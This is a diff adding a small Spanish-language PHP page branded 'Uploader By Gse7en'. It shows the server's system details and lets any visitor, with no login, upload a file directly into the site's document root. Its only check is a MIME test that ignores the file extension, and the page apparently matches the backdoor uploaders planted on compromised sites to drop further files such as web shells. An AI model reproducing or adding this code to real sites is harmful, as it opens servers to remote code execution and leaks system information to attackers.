@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Uploader By Gse7en</title>
+</head>
+<body>
+    <?php
+    // Mostrar información del sistema
+    echo "<p>Información del sistema: " . php_uname() . "</p>";
+
+    // Verificar si se ha enviado el formulario
+    if (isset($_POST['upload'])) {
+        // Ruta donde se guardará el archivo
+        $root = $_SERVER['DOCUMENT_ROOT'];
+        $files = basename($_FILES['idx_file']['name']);
+        $dest = $root . '/' . $files;
+
+        // Validar el tipo de archivo permitido (solo como ejemplo, se puede ajustar según tus necesidades)
+        $allowed_types = array('image/jpeg', 'image/png', 'application/pdf');
+        $file_type = mime_content_type($_FILES['idx_file']['tmp_name']);
+
+        if (!in_array($file_type, $allowed_types)) {
+            echo "<p>Error: Tipo de archivo no permitido.</p>";
+        } else {
+            // Intentar subir el archivo
+            if (is_writable($root)) {
+                if (@move_uploaded_file($_FILES['idx_file']['tmp_name'], $dest)) {
+                    $web = "http://" . $_SERVER['HTTP_HOST'] . "/";
+                    echo "<p>Subida exitosa -> <a href='$web$files'>$web$files</a></p>";
+                } else {
+                    echo "<p>Error: No se pudo subir el archivo en el directorio raíz.</p>";
+                }
+            } else {
+                echo "<p>Error: No se puede escribir en el directorio raíz.</p>";
+            }
+        }
+    } else {
+        echo "<p>No se eligió ningún archivo.</p>";
+    }
+    ?>
+
+    <!-- Formulario de subida de archivos -->
+    <form action="" method="post" enctype="multipart/form-data">
+        <input type="file" name="idx_file" required>
+        <input type="submit" name="upload" value="Subir archivo">
+    </form>
+</body>
+</html>
